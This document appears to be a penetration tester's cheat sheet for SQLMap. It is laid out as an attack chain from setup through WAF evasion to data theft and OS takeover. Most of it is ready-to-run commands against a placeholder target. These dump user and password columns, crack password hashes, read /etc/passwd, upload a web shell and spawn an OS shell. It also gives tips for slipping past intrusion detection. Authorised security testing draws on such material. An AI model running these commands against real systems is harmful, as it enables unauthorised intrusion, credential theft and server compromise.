# Automated SQL Injection (SQLMap)
**Concept:** SQLMap automates the "blind" guessing game of SQL injection. It supports the full range of injection techniques: **B**oolean, **E**rror, **U**nion, **S**tacked, **T**ime, and **Q**ueries (BEUSTQ). 
**Role:** Heavy weapons for database exfiltration and OS takeover.
## 1. Weaponization (Setup & Configuration)
**Goal:** Ensure the tool is up-to-date and configured to interact with the target environment correctly.
### Installation
```shell
# Standard Install
sudo apt install sqlmap

# Bleeding Edge (Recommended for new WAF bypasses)
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
python sqlmap.py
```
### Request Handling (The "-r" Flag)
**Concept:** Instead of manually constructing complex CLI strings with cookies and headers, capture the request in Burp Suite, save it to a file, and feed it to SQLMap. This is the **Gold Standard** for complex authentications.

| **Flag**                   | **Description**                                                |
| ---------------------- | ---------------------------------------------------------- |
| `-r file.req`          | Load HTTP request from a text file (Burp/ZAP export).      |
| `--cookie="ID=..."`    | Manually specify session cookies.                          |
| `--random-agent`       | Randomize User-Agent to bypass basic filters.              |
| `--proxy="http://..."` | Route traffic through Burp (127.0.0.1:8080) for debugging. |

**Syntax:**
```shell
# Method A: Direct URL (Simple)
sqlmap -u "http://target.com/vuln.php?id=1" --batch

# Method B: Request File (Complex/Authenticated)
sqlmap -r request.txt --batch
```
**OPSEC Warning:** By default, SQLMap uses a distinct User-Agent `sqlmap/1.x...`. Always use `--random-agent` or `-A "MyUserAgent"` during engagements to avoid immediate flagging by IDS.
## 2. Reconnaissance (Detection & Tuning)
**Goal:** Confirm the vulnerability and identify the backend database without triggering aggressive defenses.
### Basic Detection
```shell
# -u: Target URL
# --batch: Auto-accept defaults (Non-interactive)
# --parse-errors: Display DBMS errors in the output (Good for debugging)
sqlmap -u "http://target.com/?id=1" --batch --parse-errors
```
### Aggressive Tuning (Level & Risk)
If the default scan fails, increase the scope.
- **Level (1-5):** What to scan. Level 1 = GET/POST. Level 5 = Headers (Cookie, Referer, User-Agent).
- **Risk (1-3):** How dangerous the payloads are. Risk 3 adds OR-based heavy queries (Can destroy data).

```shell
# High Intensity Scan
sqlmap -u "http://target.com/?id=1" --level=5 --risk=3
```
**OPSEC Warning:** `--level=5` generates thousands of requests. `--risk=3` can update/delete database rows. Use with caution.
### Injection Point Tuning
If you know _where_ the injection is, tell SQLMap to focus there to save time.
```shell
# Inject into the 'uid' parameter specifically
sqlmap -u "http://target.com/" --data="uid=1*&name=test"

# Prefix/Suffix (Closing the query manually)
# Useful if the code is: SELECT * FROM users WHERE id = ('$id')
sqlmap -u "http://target.com/?q=test" --prefix="%'))" --suffix="-- -"
```
## 3. Evasion (WAF Bypass)
**Goal:** Obfuscate the injection payloads to bypass Web Application Firewalls (WAF).
### Tamper Scripts
SQLMap includes scripts to modify payloads (e.g., changing `UNION` to `uNiOn`).

| **Script**          | **Function**                                    |
| --------------- | ------------------------------------------- |
| `between`       | Replaces `>` with `NOT BETWEEN`.            |
| `space2comment` | Replaces spaces with `/**/`.                |
| `randomcase`    | Randomizes keyword case (SELECT -> SeLeCT). |
| `charencode`    | URL encodes the payload.                    |
**Syntax:**
```shell
# List all scripts
sqlmap --list-tampers

# Apply specific scripts
sqlmap -u "http://target.com/?id=1" --tamper="space2comment,randomcase"
```
### Technique Specifics
- `--skip-waf`: Skip heuristic WAF checks (reduces noise).
- `--chunked`: Chunk the HTTP POST body (bypasses some WAF length checks).
- `--random-agent`: Essential for avoiding User-Agent blacklists.
## 4. Exploitation (Enumeration)
**Goal:** Extract data. The order of operations is **Banner -> DBs -> Tables -> Columns -> Data**.
### 1. Fingerprinting
```shell
# Get Banner, Current User, Current DB, and check Admin rights
sqlmap -r req.txt --banner --current-user --current-db --is-dba
```
### 2. Structure Enumeration
```shell
# List Databases
sqlmap -r req.txt --dbs

# List Tables in a specific Database (-D)
sqlmap -r req.txt -D target_db --tables

# List Columns in a specific Table (-T)
sqlmap -r req.txt -D target_db -T users --columns
```
### 3. Data Extraction (The Loot)
```shell
# Dump specific columns
sqlmap -r req.txt -D target_db -T users -C user,password --dump

# Conditional Dump (Speed up extraction)
sqlmap -r req.txt -D target_db -T users --dump --where="id>10"
```
### 4. Password Cracking
SQLMap automatically attempts to crack hashed passwords found in the database using a built-in dictionary.
```shell
# --passwords: Search for password hashes
sqlmap -r req.txt --passwords --batch
```
## 5. Actions on Objectives (OS Exploitation)
**Goal:** Transition from Database Access to System Access (RCE). 
**Prerequisite:** The DB User must be an Administrator (DBA) and file permissions must allow it.
### File System Access
Read or write files to the server.
```shell
# Read /etc/passwd
sqlmap -r req.txt --file-read "/etc/passwd"

# Upload a Web Shell
sqlmap -r req.txt --file-write "shell.php" --file-dest "/var/www/html/shell.php"
```
### OS Command Execution
If the database supports `xp_cmdshell` (MSSQL) or `sys_exec` (MySQL via UDF), SQLMap can spawn a shell.
```shell
# Spawn an interactive OS shell
sqlmap -r req.txt --os-shell

# Force a specific technique (e.g., Error-based)
sqlmap -r req.txt --os-shell --technique=E
```